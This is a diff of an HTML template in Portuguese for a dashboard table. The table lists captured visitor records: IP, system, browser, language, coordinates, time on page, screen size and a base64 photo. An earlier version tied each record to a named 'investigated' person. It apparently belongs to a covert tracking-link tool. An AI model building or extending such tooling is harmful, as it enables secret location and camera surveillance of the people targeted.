@@ -78,39 +78,25 @@
     <h2>📊 Registros Recentes</h2>
     <table>
         <tr>
-            <th>ID</th>
-            <th>IP</th>
-            <th>User-Agent</th>
-            <th>Latitude</th>
-            <th>Longitude</th>
-            <th>Data</th>
-            <th>Investigado</th>
-            <th>Foto</th>
-            <th>Localização</th>
+            <th>Data</th><th>IP</th><th>Sistema</th><th>Navegador</th><th>Idioma</th>
+            <th>Localização</th><th>Conexão</th><th>Tempo</th><th>Resolução</th><th>Foto</th>
         </tr>
         {% for r in registros %}
         <tr>
-            <td>{{ r.id }}</td>
+            <td>{{ r.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
             <td>{{ r.ip }}</td>
-            <td>{{ r.user_agent }}</td>
-            <td>{{ r.latitude }}</td>
-            <td>{{ r.longitude }}</td>
-            <td>{{ r.timestamp }}</td>
-            <td>{{ links.get(r.slug, "Desconhecido") }}</td> <!-- Nome do investigado -->
+            <td>{{ r.sistema }}</td>
+            <td>{{ r.navegador }}</td>
+            <td>{{ r.idioma }}</td>
+            <td>{{ r.latitude }}, {{ r.longitude }}</td>
+            <td>{{ r.conexao }}</td>
+            <td>{{ r.tempo_segundos }}s</td>
+            <td>{{ r.largura_tela }}x{{ r.altura_tela }}</td>
             <td>
                 {% if r.foto_base64 %}
-                    <img src="{{ r.foto_base64 }}" width="100">
+                    <img src="{{ r.foto_base64 }}" width="80">
                 {% else %}
-                    —
-                {% endif %}
-            </td>
-            <td>
-                {% if r.latitude and r.longitude %}
-                    <a href="https://www.google.com/maps?q={{ r.latitude }},{{ r.longitude }}" target="_blank" class="mapa-btn">
-                        Ver no Maps
-                    </a>
-                {% else %}
-                    —
+                    Nenhuma
                 {% endif %}
             </td>
         </tr>
